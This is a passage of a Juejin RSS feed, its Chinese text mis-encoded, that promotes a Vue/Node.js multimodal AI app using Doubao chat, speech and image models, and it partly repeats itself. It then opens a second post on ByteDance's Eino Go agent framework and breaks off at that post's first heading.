<li>æ”¯æŒæ ¼å¼è½¬æ¢ï¼ˆFloat32 â†’ Int16 PCMï¼‰</li>
<li>WebSocket é€šä¿¡ã€é”™è¯¯é‡è¿æœºåˆ¶</li>
<li>æœ€å°å»¶è¿Ÿè¯†åˆ«ç»“æœï¼Œè¾¹è¯´è¾¹å¡«ä¸æ‰å¸§</li>
</ul>
<p><strong>ç»“æœ</strong>ï¼šæ‰“å­—æ•ˆç‡ Ã—2ï¼Œä¸ç”¨å†æ‰‹åŠ¨è¾“å…¥é•¿æ®µå†…å®¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0392e44e9e540b4bc67ba8e88abb815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57yW56iL5bmy6LSn6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598909&amp;x-signature=J6fCcGlmzJBJa0%2FnNYETd%2BwH5gc%3D" alt="" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-10">ğŸ¨ 7. å›¾ç‰‡ç”Ÿæˆï¼šä¸ä»…èƒ½ç”»ï¼Œè¿˜èƒ½ä¿å­˜å¾—ä½</h4>
<p>è±†åŒ…å›¾åƒç”Ÿæˆæ˜¯åœ¨çº¿å›¾ç‰‡ URLï¼Œä½† URL 1 å°æ—¶å°±å¤±æ•ˆï¼Ÿ</p>
<p>æˆ‘ä»¬çš„å¤„ç†æ–¹å¼ï¼š</p>
<ul>
<li>åç«¯è‡ªåŠ¨å°†å›¾ç‰‡ä¸‹è½½å­˜åˆ°æœ¬åœ°</li>
<li>æ”¯æŒæ™ºèƒ½è¯†åˆ«æ ¼å¼ï¼Œæœ€å¤šå¹¶å‘ä¸‹è½½ 4 å¼ </li>
<li>æœ¬åœ°è·¯å¾„å†™å…¥æ•°æ®åº“ï¼Œ<strong>å›¾ç‰‡é•¿æœŸå¯ç”¨</strong></li>
</ul>
<hr/>
<h3 data-id="heading-11">âœ… å·¥ç¨‹åŒ–ç»†èŠ‚è¡¥å……</h3>
<ul>
<li><strong>ç»Ÿä¸€å¼‚å¸¸å¤„ç† &amp; æ—¥å¿—è®°å½•</strong>ï¼ˆä½¿ç”¨ Morganï¼‰</li>
<li><strong>æ¥å£å“åº”æ ¼å¼ç»Ÿä¸€</strong>ï¼ˆcode/msg/dataï¼‰</li>
<li><strong>æ¨¡å—è§£è€¦æ¸…æ™°</strong>ï¼Œæ–¹ä¾¿åæœŸåŠŸèƒ½æ‰©å±•</li>
<li><strong>Prisma ç±»å‹æ¨å¯¼ + è‡ªåŠ¨ç”Ÿæˆ SQL</strong></li>
<li><strong>WebSocket ä¸ REST ååŒç®¡ç†è¿æ¥çŠ¶æ€</strong></li>
</ul>
<hr/>
<h3 data-id="heading-12">ğŸ§¾ æ€»ç»“ä¸€ä¸‹</h3>
<p>ä½ å¯ä»¥æŠŠè¿™ä¸ªé¡¹ç›®ç†è§£æˆä¸€ä¸ªâ€œè½»é‡ AI å¤šæ¨¡æ€å¹³å°â€ã€‚</p>
<p>âœ” å®‰å…¨æ€§ï¼šJWT + Cookie + åŠ å¯†âœ” ç”¨æˆ·ä½“éªŒï¼šæµå¼ã€å®æ—¶ã€ä¸å¡é¡¿âœ” å·¥ç¨‹è´¨é‡ï¼šæ¶æ„æ¸…æ™°ï¼Œä»£ç è§„èŒƒï¼Œæ—¥å¿—å¯è§‚æµ‹âœ” AI èƒ½åŠ›ï¼šå¯¹è¯ + è¯­éŸ³ + å›¾åƒï¼Œå¤šæ¨¡æ€æ•´åˆâœ” å¯ç»´æŠ¤æ€§ï¼šæ¨¡å—åŒ–å¼€å‘ï¼Œæ–¹ä¾¿ç»§ç»­æ‰©å±•æ–°æ¨¡å‹ã€æ–°åŠŸèƒ½</p>
<hr/>
<p>ä»0åˆ°1æ‰“é€ ä¸€æ¬¾å…·å¤‡AièŠå¤©ï¼ŒAIå†™ä½œï¼Œæ–‡ç”Ÿå›¾ï¼Œè¯­éŸ³åˆæˆï¼Œè¯­éŸ³è¯†åˆ«åŠŸèƒ½çš„å¤šæ¨¡æ€å…¨æ ˆé¡¹ç›®ï¼›</p>
<p>æ‰«ç äº†è§£ï¼š</p>
<hr/>
<h2 data-id="heading-13">ğŸš€</h2>
<p>æœ€è¿‘æäº†ä¸€ä¸ªæŒºæœ‰æ„æ€çš„é¡¹ç›®ï¼šç”¨Â <strong>Vue3.5 + Node.js</strong>Â ä» 0 åˆ° 1 æ‰“é€ ä¸€ä¸ªç”Ÿäº§çº§çš„ AI å¤šæ¨¡æ€åº”ç”¨ã€‚</p>
<p>ä½ å¯ä»¥åœ¨é‡Œé¢ï¼š</p>
<ul>
<li>è·Ÿ AI å®æ—¶å¯¹è¯ï¼ˆæ”¯æŒæµå¼æ‰“å­—åŠ¨ç”»ï¼‰ğŸ’¬</li>
<li>è¾“å…¥æ–‡å­—ï¼Œç›´æ¥åˆæˆè¯­éŸ³ï¼Œç§’å˜æ’­éŸ³å‘˜ğŸ™ï¸</li>
<li>æ‰“å¼€éº¦å…‹é£ï¼Œâ€œè¾¹è¯´è¾¹å†™â€ï¼Œè¯­éŸ³å®æ—¶è½¬æ–‡å­—ğŸ—£ï¸â†’âŒ¨ï¸</li>
<li>ç”šè‡³è¿˜èƒ½ç”¨ä¸€å¥è¯ç”Ÿæˆå›¾ç‰‡ğŸ¨ï¼</li>
</ul>
<p>ğŸ‘‡å…ˆä¸Šä¸ªå›¾é•‡æ¥¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/096131f632d74f2ea7806039b5e3553c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57yW56iL5bmy6LSn6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598909&amp;x-signature=DCbf6%2FIJw1XalZUPnURLXa0mAnc%3D" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-14">ğŸ§  é¡¹ç›®èƒŒæ™¯ &amp; æŠ€æœ¯é€‰å‹</h3>
<p>ä¼ ç»Ÿ AI åº”ç”¨ä¸€èˆ¬åªåšåˆ°èŠå¤©æˆ–è¯­éŸ³å•ç‚¹åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯â€”â€”<strong>å¤šæ¨¡æ€æ•´åˆï¼Œç”¨æˆ·èƒ½åœ¨åŒä¸€å¹³å°ä½“éªŒå®Œæ•´çš„ AI èƒ½åŠ›</strong>ã€‚</p>
<p>æŠ€æœ¯æ ˆé€‰å¾—éƒ½æ˜¯æœ€æ–°ç¨³å®šç‰ˆï¼Œå¹¶ä¸”å›´ç»•â€œå¯ç»´æŠ¤æ€§ + æ€§èƒ½ + ç”¨æˆ·ä½“éªŒâ€ä¸‹äº†ä¸å°‘åŠŸå¤«ï¼š</p>
<h4 data-id="heading-15">ğŸ§© æŠ€æœ¯æ ˆï¼ˆæ ¸å¿ƒï¼‰</h4>
<ul>
<li><strong>å‰ç«¯ï¼š</strong> Â Vue 3.5 + Vite + Element Plus + Pinia + markdown-it</li>
<li><strong>åç«¯ï¼š</strong> Â Node.js + Express + Prisma + MySQL</li>
<li><strong>AI æ¨¡å‹ï¼š</strong> Â æ¥å…¥å­—èŠ‚çš„ è±†åŒ… å¤šä¸ªæ¨¡å‹ï¼š</li>
<li>
<ul>
<li>å¯¹è¯æ¨¡å‹ï¼ˆæ”¯æŒå¿«é€Ÿ&amp;æ·±åº¦æ€è€ƒæ¨¡å¼ï¼‰</li>
<li>å›¾åƒç”Ÿæˆï¼ˆSeedream 4.0ï¼‰</li>
<li>è¯­éŸ³åˆæˆï¼ˆTTSï¼‰</li>
<li>è¯­éŸ³è¯†åˆ«ï¼ˆASRï¼‰</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-16">ğŸ’¡æ ¸å¿ƒäº®ç‚¹æ‹†è§£ï¼ˆå¼€å‘è€…è§†è§’ï¼‰</h3>
<h4 data-id="heading-17">âœ… 1. ç™»å½• &amp; æƒé™ï¼šå®‰å…¨åšåˆ°äº†æè‡´</h4>
<p>æˆ‘ä»¬ä¸æ˜¯ç®€å•å†™ä¸ªç™»å½•æ¥å£å°±å®Œäº‹å„¿ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li><strong>JWT + HttpOnly Cookie</strong>Â å­˜å‚¨ï¼Œå‰åç«¯è‡ªåŠ¨é‰´æƒ</li>
<li>æ”¯æŒè§’è‰²æƒé™ï¼ˆç”¨æˆ· / ç®¡ç†å‘˜ï¼‰</li>
<li>é˜² CSRF / XSSï¼Œç™»å‡ºæ¸…é™¤æ‰€æœ‰çŠ¶æ€</li>
<li>å¯†ç åŠ å¯†ç”¨çš„æ˜¯ bcrypt å•å‘å“ˆå¸Œ</li>
</ul>
<blockquote>
<p><strong>ä½“éªŒä¸Š</strong>ï¼šç”¨æˆ·å®Œå…¨æ— æ„Ÿï¼Œå¼€å‘ä¸Šä¹Ÿå¾ˆçœäº‹ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-18">ğŸ§  2. AI å¯¹è¯ç³»ç»Ÿï¼šåŒæ¨¡å‹ + æµå¼è¾“å‡º</h4>
<p>å¿«é€Ÿæ¨¡å¼å›ç­”å¿«ï¼Œæ·±åº¦æ¨¡å¼é€‚åˆå¤æ‚é€»è¾‘é—®é¢˜ã€‚</p>
<p>éš¾ç‚¹æ˜¯ä¸¤ä¸ªæ¨¡å‹å‚æ•°æ ¼å¼ä¸ä¸€æ ·ï¼Œè¿˜è¦åšæµå¼è¾“å‡ºï¼ˆé€å­—æ˜¾ç¤ºï¼‰ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>åç«¯ç»Ÿä¸€å°è£…æ¥å£ï¼Œè‡ªåŠ¨åˆ¤æ–­æ¨¡å‹ç±»å‹</li>
<li>å‰ç«¯è‡ªå®šä¹‰ POST SSE å®¢æˆ·ç«¯ï¼Œæ”¯æŒæµå¼æ¸²æŸ“</li>
<li>ç”¨æˆ·åªç®¡ç‚¹æŒ‰é’®ï¼Œæ‰“å­—æ•ˆæœå¾ˆä¸æ»‘~</li>
</ul>
<hr/>
<h4 data-id="heading-19">ğŸ” 3. èŠå¤©é•¿åˆ—è¡¨ä¸å¡é¡¿ï¼Ÿæˆ‘ä»¬ç”¨äº†è™šæ‹Ÿæ»šåŠ¨ï¼</h4>
<p>èŠå¤©è®°å½•å¤šäº†ï¼Œé¡µé¢å¡é¡¿æ˜¯å¸¸æ€ï¼Ÿ</p>
<p>æˆ‘ä»¬ç”¨è™šæ‹Ÿæ»šåŠ¨ + åˆ†é¡µæ–¹æ¡ˆï¼š</p>
<ul>
<li>åˆå§‹åŠ è½½ 20 æ¡æ¶ˆæ¯ï¼Œæ”¯æŒæ»šåŠ¨åŠ è½½æ›´å¤š</li>
<li>å¯è§†åŒºåŸŸ + buffer åŒºæ¸²æŸ“ï¼Œå…¶ä»–ç”¨ padding å ä½</li>
<li>è‡ªåŠ¨ä¿æŒæ»šåŠ¨ä½ç½®ï¼Œä½“éªŒå®Œå…¨ä¸æ‰“æ–­</li>
</ul>
<p><strong>æ€§èƒ½æå‡æ•ˆæœæƒŠäººï¼š</strong></p>

























<table><thead><tr><th>é¡¹ç›®</th><th>ä¼˜åŒ–å‰</th><th>ä¼˜åŒ–å</th></tr></thead><tbody><tr><td>é¦–å±åŠ è½½</td><td>1.8 ç§’</td><td>0.3 ç§’</td></tr><tr><td>DOM èŠ‚ç‚¹</td><td>2000+</td><td>40</td></tr><tr><td>æ»šåŠ¨å¸§ç‡</td><td>30~40fps</td><td>55~60fps</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-20">ğŸ”Š 4. TTS å®æ—¶è¯­éŸ³åˆæˆï¼š0.5 ç§’å†…å¼€å£è¯´è¯ï¼</h4>
<p>ä¼ ç»Ÿ TTS æœ‰ 3~5 ç§’å»¶è¿Ÿï¼Œè¿™å¤ªæ…¢äº†ã€‚</p>
<p>æˆ‘ä»¬åšäº†ï¼š</p>
<ul>
<li>åç«¯ç”¨ WebSocket ä¸­ç»§è±†åŒ… TTS æœåŠ¡</li>
<li>å‰ç«¯ç”¨ Audio æ ‡ç­¾è¾¹æ¥æ”¶è¾¹æ’­æ”¾</li>
<li>æ–‡æœ¬é¢„å¤„ç†ï¼ˆå» markdownã€é™åˆ¶é•¿åº¦ï¼‰</li>
</ul>
<p>æœ€ç»ˆæ•ˆæœï¼š<strong>åŸºæœ¬åšåˆ°äº†â€œè¾“å…¥å³è¯´è¯â€ï¼Œå»¶è¿Ÿæ§åˆ¶åœ¨ 0.5~1 ç§’ä¹‹é—´ï¼</strong></p>
<hr/>
<h4 data-id="heading-21">ğŸ“ 5. å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ + AI å†™ä½œåŠ©æ‰‹</h4>
<p>åŸºäº WangEditor äºŒæ¬¡å°è£…ï¼š</p>
<ul>
<li>æ”¯æŒé€‰ä¸­æ–‡æœ¬ç”Ÿæˆç»­å†™å†…å®¹</li>
<li>ä¹Ÿå¯ç‚¹å‡»å·¥å…·æ è§¦å‘ AI</li>
<li>ç”Ÿæˆå†…å®¹é€å­—è¾“å‡ºï¼Œå†™å®Œè‡ªåŠ¨æ’å…¥åˆ°å…‰æ ‡å¤„</li>
</ul>
<blockquote>
<p><strong>ä¼˜åŠ¿ï¼š</strong> Â éå¸¸é€‚åˆå†™ç®€å†ã€æ–¹æ¡ˆã€å†…å®¹è‰ç¨¿ä¹‹ç±»çš„åœºæ™¯ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-22">ğŸ¤ 6. è¯­éŸ³è½¬å†™ï¼ˆASRï¼‰ï¼šçœŸæ­£åšåˆ°â€œè¾¹è¯´è¾¹å†™â€</h4>
<p>é€šè¿‡éº¦å…‹é£å½•éŸ³ â†’ PCM æµä¼ è¾“ â†’ å®æ—¶è¿”å›è¯†åˆ«ç»“æœ â†’ å®æ—¶å¡«è¿›æ–‡æœ¬æ¡†ã€‚</p>
<ul>
<li>æ”¯æŒæ ¼å¼è½¬æ¢ï¼ˆFloat32 â†’ Int16 PCMï¼‰</li>
<li>WebSocket é€šä¿¡ã€é”™è¯¯é‡è¿æœºåˆ¶</li>
<li>æœ€å°å»¶è¿Ÿè¯†åˆ«ç»“æœï¼Œè¾¹è¯´è¾¹å¡«ä¸æ‰å¸§</li>
</ul>
<p><strong>ç»“æœ</strong>ï¼šæ‰“å­—æ•ˆç‡ Ã—2ï¼Œä¸ç”¨å†æ‰‹åŠ¨è¾“å…¥é•¿æ®µå†…å®¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7528b124f5d64713b69b6db60b78dcd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57yW56iL5bmy6LSn6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598909&amp;x-signature=%2FVOifQ3Y3PPg1yETogk%2BvLmx04o%3D" alt="" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-23">ğŸ¨ 7. å›¾ç‰‡ç”Ÿæˆï¼šä¸ä»…èƒ½ç”»ï¼Œè¿˜èƒ½ä¿å­˜å¾—ä½</h4>
<p>è±†åŒ…å›¾åƒç”Ÿæˆæ˜¯åœ¨çº¿å›¾ç‰‡ URLï¼Œä½† URL 1 å°æ—¶å°±å¤±æ•ˆï¼Ÿ</p>
<p>æˆ‘ä»¬çš„å¤„ç†æ–¹å¼ï¼š</p>
<ul>
<li>åç«¯è‡ªåŠ¨å°†å›¾ç‰‡ä¸‹è½½å­˜åˆ°æœ¬åœ°</li>
<li>æ”¯æŒæ™ºèƒ½è¯†åˆ«æ ¼å¼ï¼Œæœ€å¤šå¹¶å‘ä¸‹è½½ 4 å¼ </li>
<li>æœ¬åœ°è·¯å¾„å†™å…¥æ•°æ®åº“ï¼Œ<strong>å›¾ç‰‡é•¿æœŸå¯ç”¨</strong></li>
</ul>
<hr/>
<h3 data-id="heading-24">âœ… å·¥ç¨‹åŒ–ç»†èŠ‚è¡¥å……</h3>
<ul>
<li><strong>ç»Ÿä¸€å¼‚å¸¸å¤„ç† &amp; æ—¥å¿—è®°å½•</strong>ï¼ˆä½¿ç”¨ Morganï¼‰</li>
<li><strong>æ¥å£å“åº”æ ¼å¼ç»Ÿä¸€</strong>ï¼ˆcode/msg/dataï¼‰</li>
<li><strong>æ¨¡å—è§£è€¦æ¸…æ™°</strong>ï¼Œæ–¹ä¾¿åæœŸåŠŸèƒ½æ‰©å±•</li>
<li><strong>Prisma ç±»å‹æ¨å¯¼ + è‡ªåŠ¨ç”Ÿæˆ SQL</strong></li>
<li><strong>WebSocket ä¸ REST ååŒç®¡ç†è¿æ¥çŠ¶æ€</strong></li>
</ul>
<hr/>
<h3 data-id="heading-25">ğŸ§¾ æ€»ç»“ä¸€ä¸‹</h3>
<p>ä½ å¯ä»¥æŠŠè¿™ä¸ªé¡¹ç›®ç†è§£æˆä¸€ä¸ªâ€œè½»é‡ AI å¤šæ¨¡æ€å¹³å°â€ã€‚</p>
<p>âœ” å®‰å…¨æ€§ï¼šJWT + Cookie + åŠ å¯†âœ” ç”¨æˆ·ä½“éªŒï¼šæµå¼ã€å®æ—¶ã€ä¸å¡é¡¿âœ” å·¥ç¨‹è´¨é‡ï¼šæ¶æ„æ¸…æ™°ï¼Œä»£ç è§„èŒƒï¼Œæ—¥å¿—å¯è§‚æµ‹âœ” AI èƒ½åŠ›ï¼šå¯¹è¯ + è¯­éŸ³ + å›¾åƒï¼Œå¤šæ¨¡æ€æ•´åˆâœ” å¯ç»´æŠ¤æ€§ï¼šæ¨¡å—åŒ–å¼€å‘ï¼Œæ–¹ä¾¿ç»§ç»­æ‰©å±•æ–°æ¨¡å‹ã€æ–°åŠŸèƒ½</p>
<hr/>
<p><strong>ä»0åˆ°1æ‰“é€ ä¸€æ¬¾å…·å¤‡AièŠå¤©ï¼ŒAIå†™ä½œï¼Œæ–‡ç”Ÿå›¾ï¼Œè¯­éŸ³åˆæˆï¼Œè¯­éŸ³è¯†åˆ«åŠŸèƒ½çš„å¤šæ¨¡æ€å…¨æ ˆé¡¹ç›®</strong>ï¼›</p>
<p><strong>å³ä¸‹è§’æ‰«ç äº†è§£ï¼š</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf07c684acf349bab1adcd14bae87646~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57yW56iL5bmy6LSn6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598909&amp;x-signature=Vm2ix4BduLw%2Fo8eTyAwGse%2BjGq4%3D" alt="è®¾è®¡å›¾ï¼ˆå¸¦äºŒç»´ç ï¼‰.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­—èŠ‚å¼€æº Eino æ¡†æ¶ä¸Šæ‰‹ä½“éªŒï¼šGo è¯­è¨€ç»ˆäºæœ‰èƒ½æ‰“çš„ Agent ç¼–æ’å·¥å…·äº†ï¼ˆå« RAG å®æˆ˜ä»£ç ï¼‰]]></title>    <link>https://juejin.cn/post/7588704463621128211</link>    <guid>https://juejin.cn/post/7588704463621128211</guid>    <pubDate>2025-12-29T07:16:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463621128211" data-draft-id="7589126217234087942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­—èŠ‚å¼€æº Eino æ¡†æ¶ä¸Šæ‰‹ä½“éªŒï¼šGo è¯­è¨€ç»ˆäºæœ‰èƒ½æ‰“çš„ Agent ç¼–æ’å·¥å…·äº†ï¼ˆå« RAG å®æˆ˜ä»£ç ï¼‰"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½,Go"/> <meta itemprop="datePublished" content="2025-12-29T07:16:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹ä¸­é˜³è®²AIç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/2189882892232029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­—èŠ‚å¼€æº Eino æ¡†æ¶ä¸Šæ‰‹ä½“éªŒï¼šGo è¯­è¨€ç»ˆäºæœ‰èƒ½æ‰“çš„ Agent ç¼–æ’å·¥å…·äº†ï¼ˆå« RAG å®æˆ˜ä»£ç ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2189882892232029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹ä¸­é˜³è®²AIç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:16:26.000Z" title="Mon Dec 29 2025 07:16:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;font-weight:400;line-height:2;font-size:17px;overflow-x:hidden;color:#000}.markdown-body strong{padding:1px;color:#ee3f4d}.markdown-body em{padding:0 2px;color:#f33b1f}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:30px;margin-bottom:20px;line-height:1.5;font-weight:700}.markdown-body h1{text-align:center;padding-bottom:5px;font-size:32px;color:#ac1f18}.markdown-body h1:after{content:"";display:block;margin:4px auto 0;width:100px;height:2px;border-bottom:2px solid #f33b1f}.markdown-body h2{font-size:28px;border-bottom:1px solid #f33b1f}.markdown-body h2:before{content:"# "!important;color:#f33b1f}.markdown-body h3{font-size:24px;padding-left:9px;border-left:6px solid #f33b1f}.markdown-body h4{font-size:20px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #bbb;margin:16px 0}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f9f1db;color:#ee2746;border-radius:2px;font-size:16px;padding:1px 2px}.markdown-body code,.markdown-body pre{font-family:-apple-system,-apple-system-body,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,PingFang SC,æ€æºé»‘ä½“ CN,æ€æºé»‘ä½“,JetBrains Mono,Fira Code,Menlo,Ubuntu Mono,Consolas,sans-serif}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{margin:12px 0!important;border-radius:3px;font-size:15px;padding:16px 12px;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f7f7f7}.markdown-body a{text-decoration:none;color:#1781b5;padding:0 2px;border-bottom:1px solid #1781b5}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #f33b1f;color:#ac1f18}.markdown-body blockquote{color:#3d3d3d;background-color:#fff9f9;padding:6px 16px;margin:16px 0;border-left:3px solid #f07c82}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:6px 0}.markdown-body ol,.markdown-body ul{padding-left:30px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:6px}.markdown-body ol li{padding-left:6px}.markdown-body ::marker{color:#f33b1f}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body .task-list-item input[type=checkbox]{position:relative}.markdown-body .task-list-item input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:#fff;border:1px solid #f07c82;border-radius:3px;box-sizing:border-box;z-index:1}.markdown-body .task-list-item input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-5px;left:0;right:0;bottom:0;width:0;height:0;color:#f33b1f;font-size:16px;font-weight:700;z-index:2}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border-spacing:0;border-collapse:collapse}.markdown-body table thead{background:#fff9f9;color:#000;text-align:left;font-size:15px}.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table tr:hover{background-color:#fff9f9}.markdown-body table td,.markdown-body table th{padding:12px 7px;line-height:24px;border:1px solid #f9f1db}.markdown-body table td{min-width:120px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>ä½œä¸ºä¸€å Go åç«¯å¼€å‘è€…ï¼Œè¿‡å»ä¸€å¹´åœ¨ AI åº”ç”¨å¼€å‘ä¸Šæ˜¯éå¸¸æ†‹å±ˆçš„ã€‚çœ¼çœ‹ç€ Python ç¤¾åŒºçš„ LangChainã€LlamaIndex ç©å‡ºèŠ±æ¥ï¼ŒGo ç”Ÿæ€å´åªæœ‰é›¶æ•£çš„ <code>go-openai</code> åº“ã€‚</p>
</blockquote>
<blockquote>
<p>ç›´åˆ°å­—èŠ‚è·³åŠ¨ CloudWeGo å›¢é˜Ÿå¼€æºäº† <strong>Eino</strong>ï¼Œæˆ‘è¯•ç”¨äº†ä¸€å‘¨ï¼Œæ„Ÿè§‰ Go è¯­è¨€åœ¨ AI å·¥ç¨‹åŒ–é¢†åŸŸç»ˆäºè¦ç¿»èº«äº†ã€‚æœ¬æ–‡å°†ä»<strong>ä»£ç å®æˆ˜</strong>çš„è§’åº¦ï¼Œå¸¦ä½ ä½“éªŒå¦‚ä½•ç”¨ Eino + Hertz + Milvus æ„å»ºä¸€ä¸ªä¼ä¸šçº§çš„ AI Agentã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€ ä»€ä¹ˆæ˜¯ Einoï¼Ÿè§£å†³äº†ä»€ä¹ˆç—›ç‚¹ï¼Ÿ</h2>
